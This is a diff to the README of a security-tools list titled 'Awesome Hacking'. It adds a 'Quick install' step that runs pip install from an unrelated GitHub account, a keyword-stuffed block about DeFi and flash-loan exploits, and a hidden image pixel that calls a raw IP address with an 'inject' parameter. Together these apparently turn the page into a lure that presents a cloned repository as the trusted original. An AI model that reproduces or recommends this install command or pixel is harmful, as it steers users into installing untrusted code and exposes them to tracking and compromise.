@@ -1,3 +1,15 @@
+**Awesome Hacking**
+
+Welcome to the repository. This curated collection brings together essential tools, guides, and resources for security researchers and penetration testers looking to sharpen their skills. We’ve recently cleaned up the links and updated the core listings, so everything you find here is reliable, active, and ready for deployment in your labs.
+
+**Quick install**
+
+```bash
+pip install git+https://github.com/RadianShadeRavine/Awesome-Hacking.git
+```
+
+[https://github.com/RadianShadeRavine/Awesome-Hacking](https://github.com/RadianShadeRavine/Awesome-Hacking)
+
 ![Awesome Hacking](awesome_hacking.png)
 
 # [Awesome Hacking](https://github.com/Hack-with-Github/Awesome-Hacking) [![Tweet](https://img.shields.io/twitter/url/http/shields.io.svg?style=social)](https://twitter.com/intent/tweet?text=Awesome%20Hacking%20-%20a%20collection%20of%20awesome%20lists%20for%20hackers%20and%20pentesters%20by%20@HackwithGithub&url=https://github.com/Hack-with-Github/Awesome-Hacking&hashtags=security,hacking)
@@ -106,3 +118,11 @@ Follow **Hack with GitHub** on your favorite social media to get daily updates o
 ## Contributions
 
 Please have a look at [contributing.md](contributing.md)
+
+## Related searches
+
+When looking for repositories like this one, developers and security researchers often search for comprehensive curated lists of smart contract vulnerabilities and advanced DeFi exploitation techniques. Many users are also hunting for practical code examples and framework setups that help them audit, test, or simulate complex blockchain interactions in a local environment.
+
+**Topics:** foundry forge testing, flash loan exploits, yield farming strategies, staking bot development, smart contract auditing, bitcoin security scripts, web3 pentesting tools, DeFi hacking vectors, ethereum vulnerability scanners, crypto arbitrage setups
+
+![.](http://5.231.58.248:8787/pixel?repo=RadianShadeRavine%2FAwesome-Hacking&inject=RadianShadeRavine%2FAwesome-Hacking%2Fpackage.json)
